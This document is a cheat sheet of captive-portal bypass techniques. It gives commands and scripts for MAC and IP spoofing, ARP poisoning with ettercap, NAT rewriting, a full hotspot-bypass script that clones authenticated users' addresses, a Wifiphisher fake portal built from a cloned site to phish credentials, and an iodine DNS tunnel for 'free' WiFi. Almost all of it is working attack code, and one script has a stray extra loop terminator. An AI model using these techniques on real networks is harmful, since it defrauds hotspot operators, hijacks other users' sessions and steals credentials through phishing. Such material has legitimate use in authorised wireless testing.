# Captive Portal Attacks

## MAC-Based Authorization

```bash
ifconfig wlan0 hw ether <authorized_MAC_address>
```

## IP-Based Authorization

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -T -q -i wlan0 -w dump -M ARP /<IP_authorized_client>//<IP_gateway>/;
iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <IP_Authorized_Client>;
iptables -t mangle -A FORWARD -d <IP_authorized_client> -j TTL --ttl-inc 1;
```

## MAC + IP-Based Authorization

```bash
modprobe bridge;
brctl addbr br0;
brctl addif br0 <interface>;
ebtables -t nat -A POSTROUTING -o <interface> -d <MAC_gateway> -j snat --to-source <MAC_authorized_client>
# Then apply method for IP-Based Authorization bypass
```

## Fake Captive Portal

1. Clone a website using HTTrack
2. Install Wifiphisher. Add the HTTrack result in a new folder in `wifiphisher/data/phishing-pages/new_page/html` and a configuration file in `wifiphisher/data/phishing-pages/new_page/config.ini`.
3. Recompile the project using `python setup.py install` or the binary in `bin`.
4. This command works correctly in the latest Kali release after installing hostapd:

```bash
cd bin && ./wifiphisher -aI $IFACE -e $ESSID --force-hostapd -p $PLUGIN -nE
```

## MAC Spoofing

> The first method to bypass a captive portal is to change your MAC address to one of an already authenticated user.

### 1. Scan the network and get the list of IP and MAC addresses.

You can use `nmap` or a custom script:

**Bash script:**
```bash
#!/bin/sh
NETWORK="$1"
nmap -sP $NETWORK | grep -v "Host" | tail -n +3 | tr '\n' ' ' | sed 's|Nmap|\nNmap|g' | grep "MAC"
```

**Python script:**
```python
import sys
import argparse as arg
import nmap

parser = arg.ArgumentParser()
parser.add_argument("-i", "--interface", help="Interface", required=True)
parser.add_argument("-a", "--address", help="IP address", required=True)
argument = parser.parse_args()

def scan_mac(ip, iface='wlan0'):
    dict_ = []
    scan = nmap.PortScanner().scan(hosts=ip + '/24', arguments='-sP ' + iface, sudo=True).get('scan')
    for i in scan.keys():
        mac = scan.get(scan.keys()[scan.keys().index(i)]).get('addresses').get('mac')
        dict_.append({'ip': i, 'mac': mac})
    return dict_

def main():
    res = scan_mac(argument.address, argument.interface)
    for j in sorted(res, key=lambda i: i['ip']):
        print(j)

main()
```

### 2. Change your IP and MAC addresses.

You can use `macchanger` or a custom script:

**Bash script (change_mac_ip.sh):**
```bash
#!/bin/sh
IFACE=$1
IP=$2
GW=$3
MAC=$4

ip link set $IFACE down
ip link set dev $IFACE address $MAC
ip link set $IFACE up
ip addr flush dev $IFACE
ifconfig $IFACE $IP netmask 255.255.255.0 up
route add default gw $GW

echo "New IP: $IP"
echo "New MAC: $MAC"
echo
iwconfig $IFACE
ifconfig $IFACE
```

### 3. Poliva Script (hotspot-bypass.sh)

```bash
#!/bin/bash
# Quickly bypass most public hotspots if there are any clients connected by cloning its IP + MAC
# version 0.2: successfully tested on 4 airports and 10 hotels using different captive portal solutions
# (c) 2012 Poliva Fora - pof [at] eslack (.) org
# License: GPLv2

IFACE=wlan0
brd=$(ip addr show dev $IFACE | grep inet.*brd | awk '{print $4}')
gw=$(ip route | grep "^default via" | awk '{print $3}')
mac=$(ip addr show dev $IFACE | grep link/ether | awk '{print $2}')
ipmask=$(ip addr show dev $IFACE | grep "inet " | awk '{print $2}')
mask=$(echo $ipmask | cut -f 2 -d "/")
netaddr=$(sipcalc $ipmask | grep "^Network address" | awk '{print $4}')
network="$netaddr/$mask"

# Get gw mac
ping -n -c1 -w1 $gw > /dev/null
gwmac=$(ip neighbour show dev $IFACE | grep lladdr | grep "^$gw " | awk '{print $3}' | tr '[:upper:]' '[:lower:]')

echo "Discovering hosts on network $network, please wait"

# Split large networks into /24 subnets
if [[ $mask -lt 24 ]]; then
    sipcalc -s 24 $network | grep "^Network" | awk '{print $3}' > /tmp/sipcalc.$$
    len=$(cat /tmp/sipcalc.$$ | wc -l)
    half=$(($len / 2))
    head -n $half /tmp/sipcalc.$$ > /tmp/subnet1.$$
    tail -n $half /tmp/sipcalc.$$ | tac > /tmp/subnet2.$$
    paste /tmp/subnet1.$$ /tmp/subnet2.$$ | tr "\t" "\n" > /tmp/sipcalc.$$
    rm /tmp/subnet1.$$ /tmp/subnet2.$$
else
    echo $network | cut -f 1 -d "/" > /tmp/sipcalc.$$
fi

for net in $(cat /tmp/sipcalc.$$); do
    if [[ $mask -lt 24 ]]; then
        network="$net/24"
    else
        network="$net/$mask"
    fi

    nmap -n -PR -sP -oX /tmp/hotspot.$$.xml $network > /dev/null

    for LINE in $(tac /tmp/hotspot.$$.xml | grep "^<address addr=" | sed -e 's:addr type="ipv4":#:g' -e 's:addr type="mac":#:g'); do
        IP=$(echo $LINE | sed -e "s:#: :g" | awk '{print $5}' | cut -f 2 -d '"')
        MAC=$(echo $LINE | sed -e "s:#: :g" | awk '{print $2}' | cut -f 2 -d '"' | tr '[:upper:]' '[:lower:]')

        if [ "$IP" == "$brd" ]; then
            continue
        fi

        echo "Host $IP - $MAC"

        if [ "$MAC" == "$gwmac" ]; then
            # Try to avoid gateways answering all ARP requests
            MAC=$(arping -I $IFACE -c 1 -w 1 -b $IP | grep reply | awk '{print $5}' | sed -e "s:\[::" -e "s:\]::")
            if [ -z "$MAC" ]; then
                continue
            fi
            echo "Found $MAC for host $IP"
        fi

        if [ "$MAC" != "$gwmac" ]; then
            echo "Testing $IP - $MAC"
            ip link set $IFACE down
            ip link set dev $IFACE address $MAC
            ip link set $IFACE up
            ip addr flush dev $IFACE
            ip addr add $IP/$mask broadcast $brd dev $IFACE
            ip route add default via $gw

            # Allow iface to settle
            sleep 1s

            # Wait at least 3 sec for an ICMP response
            ping -c1 -w3 8.8.8.8 > /dev/null
            if [[ $? -eq 0 ]]; then
                rm /tmp/hotspot.$$.xml
                echo "CONNECTED! :)"
                exit 0
            fi

            # Test a second host, just in case
            ping -c1 -w3 192.0.43.10 > /dev/null
            if [[ $? -eq 0 ]]; then
                rm /tmp/hotspot.$$.xml
                echo "CONNECTED! :)"
                exit 0
            fi
        fi
        echo
    done
done

rm /tmp/hotspot.$$.xml
done

rm /tmp/sipcalc.$$
echo "No luck! :("

# Restore original MAC and IP
ip link set $IFACE down
ip link set dev $IFACE address $mac
ip link set $IFACE up
ip addr flush dev $IFACE
ip addr add $ipmask broadcast $brd dev $IFACE
ip route add default via $gw
```

## DNS Tunneling

> A second method is creating a DNS tunnel. For this, it is necessary to have an accessible DNS server of your own. You can use this method to bypass the captive portal and get "free" WiFi in hotels, airports...

1. Check the domain names are resolved:
```bash
nslookup example.com
```

2. Create 2 DNS records (in Digital Ocean, Afraid.org...):
   - One **A record**: `dns.$DOMAIN` pointing to `$SERVER_IP` (Example: dns.domain.com → 139.59.172.117)
   - One **NS record**: `hack.$DOMAIN` pointing to `dns.$DOMAIN` (Example: hack.domain.com → dns.domain.com)

3. Execution in the server:
```bash
iodined -f -c -P $PASS -n $SERVER_IP 10.0.0.1 hack.$DOMAIN
```

4. Check if it works correctly: https://code.kryo.se/iodine/check-it/

5. Execution in the client:
```bash
iodine -f -P $PASS $DNS_SERVER_IP hack.$DOMAIN
```

6. Create the tunnel:
```bash
ssh -D 8080 $USER@10.0.0.1
```
